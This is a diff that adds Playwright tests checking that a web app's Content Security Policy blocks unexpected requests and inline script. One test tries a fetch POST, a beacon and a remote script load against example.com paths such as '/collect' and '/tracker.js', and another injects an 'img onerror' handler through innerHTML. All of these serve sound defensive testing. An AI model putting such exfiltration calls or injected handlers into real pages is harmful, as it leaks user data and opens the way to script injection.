@@ -44,3 +44,70 @@ test('the fonts come from the app itself', async ({ page }) => {
   );
   expect(new Set(loaded)).toEqual(new Set(['Geist', 'Geist Mono']));
 });
+
+/** Records Content Security Policy violations from the first moment the page loads. */
+const recordViolations = (page) =>
+  page.addInitScript(() => {
+    window.__csp = [];
+    document.addEventListener('securitypolicyviolation', (e) =>
+      window.__csp.push(e.violatedDirective + ' ' + e.blockedURI),
+    );
+  });
+
+test('normal use never trips the Content Security Policy', async ({ page }) => {
+  await recordViolations(page);
+  await openApp(page);
+  await useTheApp(page);
+  await page.click('.tabs [data-act=nav][data-v=settings]');
+  await page.click('[data-act=setAccent][data-v="#C23B5F"]');
+  await page.click('[data-act=setTheme][data-v=dark]');
+  expect(await page.evaluate(() => window.__csp)).toEqual([]);
+});
+
+test('the browser blocks any attempt to send data to another site', async ({ page, context }) => {
+  // If anything got past the policy it would reach this route; a blocked request never does.
+  const reached = [];
+  await context.route('https://example.com/**', (route) => {
+    reached.push(route.request().url());
+    return route.fulfill({ status: 200, body: '' });
+  });
+  await recordViolations(page);
+  await openApp(page);
+  const attempts = await page.evaluate(async () => {
+    const tryIt = (fn) =>
+      Promise.resolve()
+        .then(fn)
+        .then(
+          () => 'sent',
+          () => 'blocked',
+        );
+    return {
+      fetch: await tryIt(() => fetch('https://example.com/collect', { method: 'POST', body: 'x' })),
+      // sendBeacon only reports that the data was queued; the policy blocks it after that.
+      beacon: navigator.sendBeacon('https://example.com/beacon', 'x') && 'queued',
+      script: await new Promise((resolve) => {
+        const s = document.createElement('script');
+        s.src = 'https://example.com/tracker.js';
+        s.onload = () => resolve('sent');
+        s.onerror = () => resolve('blocked');
+        document.head.appendChild(s);
+      }),
+    };
+  });
+  expect(attempts).toEqual({ fetch: 'blocked', beacon: 'queued', script: 'blocked' });
+  await expect
+    .poll(() => page.evaluate(() => window.__csp.map((v) => v.split(' ')[0]).sort()))
+    .toEqual(['connect-src', 'connect-src', 'script-src-elem']);
+  expect(reached, 'requests that left the page').toEqual([]);
+});
+
+test('injected inline script does not run', async ({ page }) => {
+  await openApp(page);
+  await page.evaluate(() => {
+    const d = document.createElement('div');
+    d.innerHTML = '<img src="x" onerror="window.__ran = true">';
+    document.body.appendChild(d);
+  });
+  await page.waitForTimeout(300);
+  expect(await page.evaluate(() => window.__ran)).toBeUndefined();
+});
